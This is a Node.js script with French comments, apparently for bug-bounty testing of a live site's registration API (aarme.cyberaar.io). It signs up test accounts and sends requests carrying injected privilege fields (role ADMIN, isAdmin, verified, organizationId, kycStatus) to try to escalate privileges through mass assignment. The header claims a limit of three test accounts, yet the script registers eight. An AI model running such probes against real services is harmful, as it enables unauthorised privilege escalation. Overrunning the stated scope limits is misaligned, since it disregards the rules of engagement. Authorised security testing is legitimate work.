// CYBERAAR : inscription + test de MASS ASSIGNMENT (actif Critique : aarme.cyberaar.io)
// Regles : comptes de test avec mes propres adresses email (max 3) ; pas de DoS ; pas de donnees reelles touchees.
import fs from "fs";
const BASE = "https://aarme.cyberaar.io";
const EMAIL = "bbtest4926@maxxspace.com"; // boite que je peux lire (mail.tm) -> verification possible
const UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36";
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const out = [];
async function post(path, body, extra = {}) {
  const t0 = Date.now();
  const r = await fetch(BASE + path, { method: "POST", headers: { "Content-Type": "application/json", Accept: "application/json", "User-Agent": UA, ...(extra.h || {}) }, body: JSON.stringify(body), redirect: "manual", signal: AbortSignal.timeout(25000) });
  const txt = await r.text();
  let j = null; try { j = JSON.parse(txt); } catch {}
  const rec = { path, body, s: r.status, ms: Date.now() - t0, setCookie: r.headers.getSetCookie?.() || [], body: txt.slice(0, 600) };
  out.push(rec);
  return rec;
}
async function get(path, cookie) {
  const r = await fetch(BASE + path, { headers: { Accept: "application/json", "User-Agent": UA, ...(cookie ? { Cookie: cookie } : {}) }, redirect: "manual", signal: AbortSignal.timeout(25000) });
  const txt = await r.text();
  let j = null; try { j = JSON.parse(txt); } catch {}
  return { s: r.status, txt, j };
}
const show = (l, r) => console.log("  " + l.padEnd(52) + "HTTP " + r.s + " " + String(r.ms || 0).padStart(5) + "ms  " + (r.body || "").replace(/\s+/g, " ").slice(0, 170));

console.log("=== A) inscription BASIQUE (compte de test, mon adresse) ===");
const base = { name: "bb-probe", email: EMAIL, profile: "Chercheur de securite - test de mass assignment", level: "debutant", password: "Bb-test-2026-ok!", accord: true, lang: "fr", hp: "" };
let r1 = await post("/api/aarme/account/register", base);
show("inscription (corps nominal)", r1);
console.log("  cookies recus :", r1.setCookie.map((c) => c.split(";")[0]).join(" | ") || "(aucun)");
for (const c of r1.setCookie) console.log("      " + c);
const cookie = r1.setCookie.map((c) => c.split(";")[0]).join("; ");
if (cookie) {
  const s1 = await get("/api/aarme/account/session", cookie);
  console.log("  session apres inscription :", s1.s, s1.txt.replace(/\s+/g, " ").slice(0, 400));
}

console.log("\n=== B) MASS ASSIGNMENT : champs de privileges ajoutes a l inscription ===");
const variants = [
  ["role=ADMIN", { ...base, email: "bb-probe-a@maxxspace.com", role: "ADMIN" }],
  ["roles=[ADMIN]", { ...base, email: "bb-probe-b@maxxspace.com", roles: ["ADMIN"] }],
  ["isStaff/isAdmin/verified", { ...base, email: "bb-probe-c@maxxspace.com", isStaff: true, isAdmin: true, verified: true, emailVerified: true }],
  ["reputation/level eleve", { ...base, email: "bb-probe-d@maxxspace.com", level: "expert", reputation: 99999, xp: 99999, totalEarned: 5000000, longestStreak: 999 }],
  ["organizationId/owner", { ...base, email: "bb-probe-e@maxxspace.com", organizationId: "0d06701f-d109-4280-b10e-8a923fa69346", organization: { id: "0d06701f-d109-4280-b10e-8a923fa69346" } }],
  ["id/status/approvedAt", { ...base, email: "bb-probe-f@maxxspace.com", id: "11111111-2222-3333-4444-555555555555", status: "APPROVED", approvedAt: "2020-01-01T00:00:00.000Z", createdAt: "2020-01-01T00:00:00.000Z" }],
  ["usernameHandle/kudos", { ...base, email: "bb-probe-g@maxxspace.com", username: "bb-admin", handle: "bb-admin", badges: 99, kycStatus: "APPROVED" }],
];
for (const [lbl, body] of variants) {
  const r = await post("/api/aarme/account/register", body);
  show(lbl, r);
  await sleep(1200);
}

console.log("\n=== C) reponse complete de la premiere inscription (forme des erreurs) ===");
console.log("  " + r1.body.replace(/\s+/g, " ").slice(0, 500));
fs.writeFileSync("/tmp/opencode/cyberaar/register-tests.json", JSON.stringify(out, null, 1));
console.log("\n-> /tmp/opencode/cyberaar/register-tests.json (" + out.length + " appels)");
